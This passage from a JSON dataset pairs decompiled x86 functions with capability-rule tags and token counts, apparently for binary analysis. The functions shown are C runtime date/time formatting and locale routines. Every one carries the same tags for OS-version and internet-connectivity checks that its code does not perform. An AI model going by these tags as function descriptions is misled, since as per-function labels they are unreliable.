}\ncode_r0x00406601:\n    *(unaff_EBP + -0x3c) = 0x406609;\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 1566
    },
    "00406a20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406a20(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint noname_1;\n    \n    if (in_AL < '[') {\n        if (in_AL == 'Z') {\ncode_r0x00406c11:\n            fcn.0040937b();\ncode_r0x00406c76:\n            fcn.00406951();\n            return 1;\n        }\n        if (in_AL < 'N') {\n            if (in_AL != 'M') {\n                if (in_AL == '%') {\n                    **in_ECX = 0x25;\n                    *in_ECX = *in_ECX + 1;\n                    *unaff_EBX = *unaff_EBX + -1;\n                    return 1;\n                }\n                if ((in_AL == 'A') || (in_AL == 'B')) goto code_r0x00406c76;\n                if ((in_AL != 'H') && (in_AL != 'I')) {\n                    return 1;\n                }\n            }\ncode_r0x00406ae8:\n            fcn.004069a7(arg_14h);\n            return 1;\n        }\n        if (((in_AL == 'S') || (in_AL == 'U')) || (in_AL == 'W')) goto code_r0x00406ae8;\n        if (in_AL != 'X') {\n            if (in_AL != 'Y') {\n                return 1;\n            }\n            goto code_r0x00406ae8;\n        }\n    }\n    else {\n        if ('m' < in_AL) {\n            if (in_AL == 'p') goto code_r0x00406c76;\n            if (in_AL == 'w') goto code_r0x00406ae8;\n            if (in_AL == 'x') {\n                if (arg_14h == 0) {\n                    noname_1 = 0;\n                }\n                else {\n                    noname_1 = 1;\n                }\n                goto code_r0x00406afd;\n            }\n            if (in_AL == 'y') goto code_r0x00406ae8;\n            if (in_AL != 'z') {\n                return 1;\n            }\n            goto code_r0x00406c11;\n        }\n        if (in_AL == 'm') goto code_r0x00406ae8;\n        if ((in_AL == 'a') || (in_AL == 'b')) goto code_r0x00406c76;\n        if (in_AL != 'c') {\n            if ((in_AL != 'd') && (in_AL != 'j')) {\n                return 1;\n            }\n            goto code_r0x00406ae8;\n        }\n        iVar1 = fcn.00406c86(arg_8h, arg_14h != 0, arg_ch, in_ECX, unaff_EBX, arg_10h, unaff_EDI, unaff_ESI, unaff_EBP, \n                             unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if (*unaff_EBX == 0) {\n            return 0;\n        }\n        **in_ECX = 0x20;\n        *in_ECX = *in_ECX + 1;\n        *unaff_EBX = *unaff_EBX + -1;\n    }\n    noname_1 = 2;\ncode_r0x00406afd:\n    iVar1 = fcn.00406c86(arg_8h, noname_1, arg_ch, in_ECX, unaff_EBX, arg_10h, unaff_EDI, unaff_ESI, unaff_EBP, \n                         unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 932
    },
    "00406c86": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_42h\n\nvoid __cdecl\nfcn.00406c86(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint32_t *puVar4;\n    uint8_t **ppuVar5;\n    uint uVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint *arg_8h_00;\n    char *pcVar9;\n    int32_t iVar10;\n    char cVar11;\n    uint8_t *puVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    ushort *puVar15;\n    int32_t unaff_EBP;\n    uint var_19h;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_4h;\n    uint var_54h_2;\n    uint var_48h_2;\n    uint var_42h_2;\n    uint var_38h;\n    uint var_54h;\n    uint var_30h_2;\n    uint var_2ch_2;\n    uint var_48h;\n    uint var_42h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    var_20h = 0x38;\n    var_24h = 0x40c960;\n    fcn.004026d8();\n    if (*(unaff_EBP + 0xc) == 0) {\n        uVar6 = *(*(unaff_EBP + 0x1c) + 0xa0);\n    }\n    else if (*(unaff_EBP + 0xc) == 1) {\n        uVar6 = *(*(unaff_EBP + 0x1c) + 0xa4);\n    }\n    else {\n        uVar6 = *(*(unaff_EBP + 0x1c) + 0xa8);\n    }\n    *(unaff_EBP + -0x20) = uVar6;\n    if (*(*(unaff_EBP + 0x1c) + 0xb0) == 1) {\n        puVar15 = *(unaff_EBP + 0x10);\n    }\n    else {\n        pcVar7 = _sym.imp.KERNEL32.dll_GetDateFormatA;\n        if (*(unaff_EBP + 0xc) == 2) {\n            pcVar7 = _sym.imp.KERNEL32.dll_GetTimeFormatA;\n        }\n        *(unaff_EBP + -0x30) = pcVar7;\n        puVar15 = *(unaff_EBP + 0x10);\n        *(unaff_EBP + -0x48) = puVar15[10] + 0x76c;\n        *(unaff_EBP + -0x46) = puVar15[8] + 1;\n        *(unaff_EBP + -0x42) = puVar15[6];\n        *(unaff_EBP + -0x40) = puVar15[4];\n        *(unaff_EBP + -0x3e) = puVar15[2];\n        *(unaff_EBP + -0x3c) = *puVar15;\n        *(unaff_EBP + -0x3a) = 0;\n        arg_8h_00 = &fcn.00406c86::var_24h;\n        iVar8 = (*pcVar7)(*(*(unaff_EBP + 0x1c) + 0xac), 0, unaff_EBP + -0x48, *(unaff_EBP + -0x20), 0, 0);\n        *(unaff_EBP + -0x2c) = iVar8;\n        if (iVar8 != 0) {\n            *(unaff_EBP + -0x34) = 0;\n            *(unaff_EBP + -4) = 0;\n            fcn.00402830();\n            *(unaff_EBP + -0x18) = &fcn.00406c86::var_24h;\n            *(unaff_EBP + -0x38) = &fcn.00406c86::var_24h;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x8) {\n                arg_8h_00 = fcn.0040162a(*(unaff_EBP + -0x2c));\n                if (arg_8h_00 == NULL) goto code_r0x00406de6;\n                *(unaff_EBP + -0x34) = 1;\n            }\n            *(unaff_EBP + -0x24) = arg_8h_00;\n            iVar8 = (**(unaff_EBP + -0x30))\n                              (*(*(unaff_EBP + 0x1c) + 0xac), 0, unaff_EBP + -0x48, *(unaff_EBP + -0x20), arg_8h_00, \n                               *(unaff_EBP + -0x2c));\n            iVar8 = iVar8 + -1;\n            if (0 < iVar8) {\n                piVar2 = *(unaff_EBP + 0x18);\n                piVar3 = *(unaff_EBP + 0x14);\n                do {\n                    if (*piVar2 == 0) break;\n                    **piVar3 = **(unaff_EBP + -0x24);\n                    *piVar3 = *piVar3 + 1;\n                    *(unaff_EBP + -0x24) = *(unaff_EBP + -0x24) + 1;\n                    *piVar2 = *piVar2 + -1;\n                    iVar8 = iVar8 + -1;\n                } while (0 < iVar8);\n            }\n            if (*(unaff_EBP + -0x34) != 0) {\n                fcn.00401512(arg_8h_00);\n            }\n            goto code_r0x00406dda;\n        }\n    }\ncode_r0x00406de6:\n    cVar11 = **(unaff_EBP + -0x20);\n    if (cVar11 != '\\0') {\n        puVar4 = *(unaff_EBP + 0x18);\n        ppuVar5 = *(unaff_EBP + 0x14);\n        while (*puVar4 != 0) {\n            *(unaff_EBP + -0x19) = 0;\n            *(unaff_EBP + -0x28) = 0;\n            pcVar9 = *(unaff_EBP + -0x20);\n            uVar14 = 0;\n            do {\n                uVar13 = uVar14;\n                pcVar9 = pcVar9 + 1;\n                uVar14 = uVar13 + 1;\n            } while (*pcVar9 == cVar11);\n            *(unaff_EBP + -0x24) = pcVar9;\n            if (cVar11 < 'e') {\n                if (cVar11 == 'd') {\n                    if (uVar13 == 0) {\n                        *(unaff_EBP + -0x28) = 1;\n                    }\n                    else if (uVar13 != 1) {\n                        if (uVar13 == 2) {\n                            *(unaff_EBP + -0x19) = 0x61;\n                        }\n                        else if (uVar13 == 3) {\n                            *(unaff_EBP + -0x19) = 0x41;\n                        }\n                        goto code_r0x0040709e;\n                    }\n                    *(unaff_EBP + -0x19) = 100;\n                    goto code_r0x0040709e;\n                }\n                if (cVar11 != '\\'') {\n                    if (cVar11 != 'A') {\n                        if (cVar11 == 'H') {\n                            if (uVar13 == 0) {\n                                *(unaff_EBP + -0x28) = 1;\n                            }\n                            else if (uVar14 != 2) goto code_r0x0040709e;\n                            *(unaff_EBP + -0x19) = 0x48;\n                        }\n                        else if (cVar11 == 'M') {\n                            if (uVar13 == 0) {\n                                *(unaff_EBP + -0x28) = 1;\n                            }\n                            else if (uVar13 != 1) {\n                                if (uVar13 == 2) {\n                                    *(unaff_EBP + -0x19) = 0x62;\n                                }\n                                else if (uVar13 == 3) {\n                                    *(unaff_EBP + -0x19) = 0x42;\n                                }\n                                goto code_r0x0040709e;\n                            }\n                            *(unaff_EBP + -0x19) = 0x6d;\n                        }\n                        else if (cVar11 == 'a') goto code_r0x00406e47;\n                        goto code_r0x0040709e;\n                    }\ncode_r0x00406e47:\n                    iVar8 = *(unaff_EBP + -0x20);\n                    iVar10 = fcn.00409440(iVar8, \"am/pm\");\n                    if (iVar10 == 0) {\n                        iVar8 = iVar8 + 5;\ncode_r0x00406ec5:\n                        *(unaff_EBP + -0x24) = iVar8;\n                    }\n                    else {\n                        iVar10 = fcn.00409440(iVar8, 0x40c950);\n                        if (iVar10 == 0) {\n                            iVar8 = iVar8 + 3;\n                            goto code_r0x00406ec5;\n                        }\n                    }\n                    *(unaff_EBP + -0x19) = 0x70;\n                    goto code_r0x0040709e;\n                }\n                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + uVar14;\n                if ((uVar14 & 1) != 0) {\n                    puVar12 = *(unaff_EBP + -0x20);\n                    while( true ) {\n                        uVar1 = *puVar12;\n                        if ((uVar1 == 0) || (*puVar4 == 0)) goto code_r0x004070fe;\n                        if (uVar1 == 0x27) break;\n                        if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) == 0) || (*puVar4 < 2)) {\n                            puVar12 = *(unaff_EBP + -0x20);\n                        }\n                        else {\n                            puVar12 = *(unaff_EBP + -0x20) + 1;\n                            if (*puVar12 == 0) goto code_r0x00406dda;\n                            **ppuVar5 = uVar1;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                        **ppuVar5 = *puVar12;\n                        *ppuVar5 = *ppuVar5 + 1;\n                        puVar12 = puVar12 + 1;\n                        *(unaff_EBP + -0x20) = puVar12;\n                        *puVar4 = *puVar4 - 1;\n                    }\n                    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n                }\n            }\n            else {\n                if (cVar11 == 'h') {\n                    if (uVar13 == 0) {\n                        *(unaff_EBP + -0x28) = 1;\n                    }\n                    else if (uVar14 != 2) goto code_r0x0040709e;\n                    *(unaff_EBP + -0x19) = 0x49;\ncode_r0x0040709e:\n                    if (*(unaff_EBP + -0x19) == '\\0') {\n                        puVar12 = *(unaff_EBP + -0x20);\n                        uVar1 = *puVar12;\n                        if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < *puVar4)) {\n                            puVar12 = puVar12 + 1;\n                            if (*puVar12 == 0) break;\n                            **ppuVar5 = uVar1;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                        **ppuVar5 = *puVar12;\n                        *ppuVar5 = *ppuVar5 + 1;\n                        *(unaff_EBP + -0x20) = puVar12 + 1;\n                        *puVar4 = *puVar4 - 1;\n                        goto code_r0x004070fe;\n                    }\n                    iVar8 = fcn.00406a20(*(unaff_EBP + 8), *(unaff_EBP + 0x10), *(unaff_EBP + 0x1c), \n                                         *(unaff_EBP + -0x28));\n                    if (iVar8 == 0) break;\n                }\n                else {\n                    if (cVar11 == 'm') {\n                        if (uVar13 == 0) {\n                            *(unaff_EBP + -0x28) = 1;\n                        }\n                        else if (uVar14 != 2) goto code_r0x0040709e;\n                        *(unaff_EBP + -0x19) = 0x4d;\n                        goto code_r0x0040709e;\n                    }\n                    if (cVar11 == 's') {\n                        if (uVar13 == 0) {\n                            *(unaff_EBP + -0x28) = 1;\n                        }\n                        else if (uVar14 != 2) goto code_r0x0040709e;\n                        *(unaff_EBP + -0x19) = 0x53;\n                        goto code_r0x0040709e;\n                    }\n                    if (cVar11 != 't') {\n                        if (cVar11 == 'y') {\n                            if (uVar13 == 1) {\n                                *(unaff_EBP + -0x19) = 0x79;\n                            }\n                            else if (uVar13 == 3) {\n                                *(unaff_EBP + -0x19) = 0x59;\n                            }\n                        }\n                        goto code_r0x0040709e;\n                    }\n                    if (*(puVar15 + 4) < 0xc) {\n                        puVar12 = *(*(unaff_EBP + 0x1c) + 0x98);\n                    }\n                    else {\n                        puVar12 = *(*(unaff_EBP + 0x1c) + 0x9c);\n                    }\n                    if ((uVar14 == 1) && (*puVar4 != 0)) {\n                        uVar1 = *puVar12;\n                        if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < *puVar4)) {\n                            puVar12 = puVar12 + 1;\n                            if (*puVar12 == 0) break;\n                            **ppuVar5 = uVar1;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                        **ppuVar5 = *puVar12;\n                        *ppuVar5 = *ppuVar5 + 1;\n                        *puVar4 = *puVar4 - 1;\n                    }\n                    else {\n                        while( true ) {\n                            uVar1 = *puVar12;\n                            if ((uVar1 == 0) || (*puVar4 == 0)) break;\n                            if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < *puVar4)) {\n                                puVar12 = puVar12 + 1;\n                                if (*puVar12 == 0) goto code_r0x00406dda;\n                                **ppuVar5 = uVar1;\n                                *ppuVar5 = *ppuVar5 + 1;\n                                *puVar4 = *puVar4 - 1;\n                            }\n                            **ppuVar5 = *puVar12;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            puVar12 = puVar12 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                    }\n                }\n                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x24);\n            }\ncode_r0x004070fe:\n            cVar11 = **(unaff_EBP + -0x20);\n            if (cVar11 == '\\0') break;\n            puVar15 = *(unaff_EBP + 0x10);\n        }\n    }\ncode_r0x00406dda:\n    *(unaff_EBP + -0x58) = 0x406de2;\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 4024
    },
    "00407110": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00407110(int32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint8_t *arg_14h, uint arg_18h, uint32_t arg_1ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t arg_10h_00;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_ch;\n    arg_10h_00 = arg_1ch;\n    if (arg_1ch == 0) {\n        arg_10h_00 = *(arg_8h + 0x4c);\n    }\n    if (arg_10h != 0) {\n        arg_1ch = arg_10h;\n        if (arg_10h != 0) {\n            do {\n                uVar1 = *arg_14h;\n                if (uVar1 == 0) break;\n                if (uVar1 == 0x25) {\n                    puVar4 = arg_14h + 1;\n                    uVar1 = *puVar4;\n                    if (uVar1 == 0x23) {\n                        puVar4 = arg_14h + 2;\n                    }\n                    iVar3 = fcn.00406a20(arg_8h, arg_18h, arg_10h_00, uVar1 == 0x23);\n                    if (iVar3 == 0) goto code_r0x004071c6;\n                }\n                else {\n                    if (((*(*(arg_8h + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < arg_1ch)) {\n                        arg_14h = arg_14h + 1;\n                        if (*arg_14h == 0) goto code_r0x004071c6;\n                        *arg_ch = uVar1;\n                        arg_ch = arg_ch + 1;\n                        arg_1ch = arg_1ch - 1;\n                    }\n                    *arg_ch = *arg_14h;\n                    arg_ch = arg_ch + 1;\n                    arg_1ch = arg_1ch - 1;\n                    puVar4 = arg_14h;\n                }\n                arg_14h = puVar4 + 1;\n            } while (arg_1ch != 0);\n            if (arg_1ch != 0) {\n                *arg_ch = 0;\n                return arg_10h - arg_1ch;\n            }\n        }\ncode_r0x004071c6:\n        *puVar2 = 0;\n        arg_10h = 0;\n    }\n    return arg_10h;\n}\n",
        "token_count": 620
    },
    "0040780e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040780e(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    ushort uVar3;\n    int32_t *arg_8h;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint *arg_8h_00;\n    uint *puVar10;\n    char *pcVar11;\n    uint *puVar12;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*0x45d698 == 0) && (*0x45d694 == 0)) {\n        if (((*0x45d7e0 != NULL) && (**0x45d7e0 == 0)) && (*0x45d7e0 != *(*0x45cdfc + 0x2c))) {\n            fcn.00401512(*0x45d7e0);\n            fcn.00401512(*0x45d6b8);\n        }\n        *0x45d7e4 = NULL;\n        *0x45d7e0 = NULL;\n        arg_8h_00 = 0x45d1cc;\n        *0x45d6b8 = NULL;\n        puVar10 = *0x45d6b8;\n        arg_8h = *0x45d7e0;\ncode_r0x004079bb:\n        *0x45d7e0 = arg_8h;\n        *0x45d6b8 = puVar10;\n        *0x45d204 = **arg_8h_00;\n        *0x45d208 = 1;\n        uVar8 = 0;\n        *0x45d1fc = arg_8h_00;\n    }\n    else {\n        arg_8h_00 = fcn.00404968(1, 0x30);\n        if (arg_8h_00 != NULL) {\n            puVar10 = *0x45d1fc;\n            puVar12 = arg_8h_00;\n            for (iVar9 = 0xc; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar12 = *puVar10;\n                puVar10 = puVar10 + 1;\n                puVar12 = puVar12 + 1;\n            }\n            arg_8h = fcn.0040162a(4);\n            if (arg_8h != NULL) {\n                *arg_8h = 0;\n                if (*0x45d698 == 0) {\n                    *0x45d7e4 = NULL;\n                    *arg_8h_00 = *0x45d1cc;\n                    arg_8h_00[1] = *0x45d1d0;\n                    arg_8h_00[2] = *0x45d1d4;\n                }\n                else {\n                    *0x45d7e4 = fcn.0040162a(4);\n                    if (*0x45d7e4 == NULL) {\n                        uVar8 = 1;\ncode_r0x00407919:\n                        fcn.00401512(arg_8h_00);\n                        fcn.00401512(arg_8h);\n                        return uVar8;\n                    }\n                    **0x45d7e4 = 0;\n                    uVar3 = *0x45d6fa;\n                    uVar4 = fcn.0040948e(1, *0x45d6fa, 0xe, arg_8h_00);\n                    uVar5 = fcn.0040948e(1, uVar3, 0xf, arg_8h_00 + 1);\n                    uVar6 = fcn.0040948e(1, uVar3, 0x10, arg_8h_00 + 2);\n                    if ((uVar6 | uVar4 | uVar5) != 0) {\n                        fcn.004077af(arg_8h_00);\n                        uVar8 = 0xffffffff;\n                        goto code_r0x00407919;\n                    }\n                    pcVar7 = arg_8h_00[2];\n                    while (*pcVar7 != '\\0') {\n                        cVar2 = *pcVar7;\n                        if ((cVar2 < '0') || ('9' < cVar2)) {\n                            pcVar11 = pcVar7;\n                            if (cVar2 != ';') goto code_r0x00407945;\n                            do {\n                                pcVar1 = pcVar11 + 1;\n                                *pcVar11 = *pcVar1;\n                                pcVar11 = pcVar1;\n                            } while (*pcVar1 != '\\0');\n                        }\n                        else {\n                            *pcVar7 = cVar2 + -0x30;\ncode_r0x00407945:\n                            pcVar7 = pcVar7 + 1;\n                        }\n                    }\n                }\n                puVar10 = arg_8h_00;\n                if (((*0x45d7e0 != NULL) && (**0x45d7e0 == 0)) && (*0x45d7e0 != *(*0x45cdfc + 0x2c))) {\n                    fcn.00401512(*0x45d7e0);\n                    fcn.00401512(*0x45d6b8);\n                }\n                goto code_r0x004079bb;\n            }\n            fcn.00401512(arg_8h_00);\n        }\n        uVar8 = 1;\n    }\n    return uVar8;\n}\n",
        "token_count": 1243
    },
    "00407ae7": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00407ae7(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    ushort uVar3;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    char *pcVar19;\n    uint uVar20;\n    int32_t iVar21;\n    char *pcVar22;\n    uint *puVar23;\n    uint *puVar24;\n    uint var_4h;\n    \n    if ((*0x45d694 == 0) && (*0x45d698 == 0)) {\n        *0x45d7dc = NULL;\n        *0x45d7e0 = NULL;\n        *0x45d1fc = 0x45d1cc;\n        *0x45d6b8 = NULL;\ncode_r0x00407d1f:\n        uVar20 = 0;\n    }\n    else {\n        arg_8h = fcn.00404968(1, 0x30);\n        if (arg_8h != NULL) {\n            arg_8h_00 = fcn.0040162a(4);\n            if (arg_8h_00 == NULL) {\n                fcn.00401512(arg_8h);\n            }\n            else {\n                *arg_8h_00 = 0;\n                if (*0x45d694 == 0) {\n                    puVar23 = 0x45d1cc;\n                    puVar24 = arg_8h;\n                    for (iVar21 = 0xc; iVar21 != 0; iVar21 = iVar21 + -1) {\n                        *puVar24 = *puVar23;\n                        puVar23 = puVar23 + 1;\n                        puVar24 = puVar24 + 1;\n                    }\n                    *0x45d7dc = NULL;\ncode_r0x00407cec:\n                    *arg_8h = **0x45d1fc;\n                    arg_8h[1] = (*0x45d1fc)[1];\n                    arg_8h[2] = (*0x45d1fc)[2];\n                    *0x45d1fc = arg_8h;\n                    *0x45d6b8 = arg_8h;\n                    *0x45d7e0 = arg_8h_00;\n                    goto code_r0x00407d1f;\n                }\n                *0x45d7dc = fcn.0040162a(4);\n                if (*0x45d7dc == NULL) {\n                    fcn.00401512(arg_8h);\n                    fcn.00401512(arg_8h_00);\n                }\n                else {\n                    **0x45d7dc = 0;\n                    uVar3 = *0x45d6f4;\n                    uVar4 = fcn.0040948e(1, *0x45d6f4, 0x15, arg_8h + 3);\n                    uVar5 = fcn.0040948e(1, uVar3, 0x14, arg_8h + 4);\n                    uVar6 = fcn.0040948e(1, uVar3, 0x16, arg_8h + 5);\n                    uVar7 = fcn.0040948e(1, uVar3, 0x17, arg_8h + 6);\n                    uVar8 = fcn.0040948e(1, uVar3, 0x18, arg_8h + 7);\n                    uVar9 = fcn.0040948e(1, uVar3, 0x50, arg_8h + 8);\n                    uVar10 = fcn.0040948e(1, uVar3, 0x51, arg_8h + 9);\n                    uVar11 = fcn.0040948e(0, uVar3, 0x1a, arg_8h + 10);\n                    uVar12 = fcn.0040948e(0, uVar3, 0x19, arg_8h + 0x29);\n                    uVar13 = fcn.0040948e(0, uVar3, 0x54, arg_8h + 0x2a);\n                    uVar14 = fcn.0040948e(0, uVar3, 0x55, arg_8h + 0x2b);\n                    uVar15 = fcn.0040948e(0, uVar3, 0x56, arg_8h + 0xb);\n                    uVar16 = fcn.0040948e(0, uVar3, 0x57, arg_8h + 0x2d);\n                    uVar17 = fcn.0040948e(0, uVar3, 0x52, arg_8h + 0x2e);\n                    uVar18 = fcn.0040948e(0, uVar3, 0x53, arg_8h + 0x2f);\n                    if ((uVar18 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 | uVar13 |\n                                  uVar14 | uVar15 | uVar16 | uVar17) == 0) {\n                        pcVar19 = arg_8h[7];\n                        while (*pcVar19 != '\\0') {\n                            cVar2 = *pcVar19;\n                            if ((cVar2 < '0') || ('9' < cVar2)) {\n                                pcVar22 = pcVar19;\n                                if (cVar2 != ';') goto code_r0x00407cba;\n                                do {\n                                    pcVar1 = pcVar22 + 1;\n                                    *pcVar22 = *pcVar1;\n                                    pcVar22 = pcVar1;\n                                } while (*pcVar1 != '\\0');\n                            }\n                            else {\n                                *pcVar19 = cVar2 + -0x30;\ncode_r0x00407cba:\n                                pcVar19 = pcVar19 + 1;\n                            }\n                        }\n                        goto code_r0x00407cec;\n                    }\n                    fcn.00407a0e(arg_8h);\n                    fcn.00401512(arg_8h);\n                    fcn.00401512(arg_8h_00);\n                }\n            }\n        }\n        uVar20 = 1;\n    }\n    return uVar20;\n}\n",
        "token_count": 1546
    },
    "00407d26": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_12h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00407d26(void)\n\n{\n    uint8_t *puVar1;\n    char16_t *noname_3;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    ushort *puVar6;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uchar auStack24 [2];\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x45cca0 ^ &stack0xfffffffc;\n    var_1ch = 0;\n    if (*0x45d690 == 0) {\n        *0x45d100 = \n        L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x81\\x81\\x81\\x81\\x81\\x81\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x10\\x10\\x10\\x10\\x10\\x10\\x82\\x82\\x82\\x82\\x82\\x82\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x10\\x10\\x10\\x10 \"\n        ;\n        *0x45d7d8 = NULL;\n        *0x45d7d4 = NULL;\n        goto code_r0x00407f07;\n    }\n    if ((*0x45d6a0 == 0) && (iVar3 = fcn.0040948e(0, *0x45d6ec, 0x1004, 0x45d6a0),  iVar3 != 0)) {\ncode_r0x00407eda:\n        fcn.00401512(var_20h);\n        fcn.00401512(var_24h);\n    }\n    else {\n        var_20h = fcn.0040162a(4);\n        var_24h = fcn.0040162a(0x300);\n        var_1ch = fcn.0040162a(0x101);\n        if ((var_20h == NULL) || ((var_24h == 0 || (var_1ch == 0)))) goto code_r0x00407eda;\n        *var_20h = 0;\n        iVar3 = 0;\n        do {\n            *(iVar3 + var_1ch) = iVar3;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x100);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(*0x45d6a0, &var_18h);\n        if ((iVar3 == 0) || (5 < var_18h)) goto code_r0x00407eda;\n        *0x45d200 = var_18h & 0xffff;\n        if ((1 < *0x45d200) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                uVar2 = *puVar4;\n                if (uVar2 == 0) break;\n                for (uVar5 = puVar4[-1]; uVar5 <= uVar2; uVar5 = uVar5 + 1) {\n                    *(uVar5 + var_1ch) = 0;\n                    uVar2 = *puVar4;\n                }\n                puVar1 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar1 